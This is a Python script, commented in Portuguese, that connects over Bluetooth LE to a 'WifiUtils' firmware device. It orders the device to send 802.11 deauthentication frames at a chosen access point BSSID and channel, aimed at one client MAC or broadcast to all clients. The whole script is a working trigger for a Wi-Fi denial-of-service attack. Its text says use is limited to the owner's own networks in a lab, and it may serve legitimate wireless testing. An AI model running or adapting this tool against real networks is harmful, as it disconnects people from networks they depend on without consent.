#!/usr/bin/env python3
"""
Dispara um deauth contra um AP/cliente. Uso restrito a redes próprias
em ambiente de laboratório.

Uso:
    ~/.platformio/penv/bin/python scripts/deauth_test.py \\
        --bssid aa:bb:cc:dd:ee:ff \\
        --channel 6 \\
        [--target 11:22:33:44:55:66] \\
        [--count 30] \\
        [--reason 7]

Sem --target → broadcast (deauth todos os clients do AP).
"""
import argparse
import asyncio
import json
import sys

from bleak import BleakClient, BleakScanner

SVC_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    async with BleakClient(dev) as client:
        await client.start_notify(CMD_UUID, lambda h, d: print(f"← {d.decode('utf-8', errors='replace')}"))

        cmd = {
            "cmd": "deauth", "seq": 1,
            "bssid": args.bssid,
            "channel": args.channel,
            "count": args.count,
            "reason": args.reason,
        }
        if args.target:
            cmd["target"] = args.target

        payload = json.dumps(cmd)
        print(f"→ {payload}")
        await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)

        # Aguarda resposta (até 10s, suficiente pra count=1000 + folga)
        await asyncio.sleep(min(10, args.count * 0.005 + 1))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Disparo de deauth via firmware WifiUtils. SOMENTE redes próprias.",
    )
    parser.add_argument("--bssid", required=True, help="BSSID do AP (aa:bb:cc:dd:ee:ff)")
    parser.add_argument("--channel", required=True, type=int, help="Canal do AP (1–14)")
    parser.add_argument("--target", help="MAC do cliente alvo (default: broadcast)")
    parser.add_argument("--count", type=int, default=30, help="Frames a enviar (default 30)")
    parser.add_argument("--reason", type=int, default=7, help="Reason code 802.11 (default 7)")
    args = parser.parse_args()

    asyncio.run(run(args))
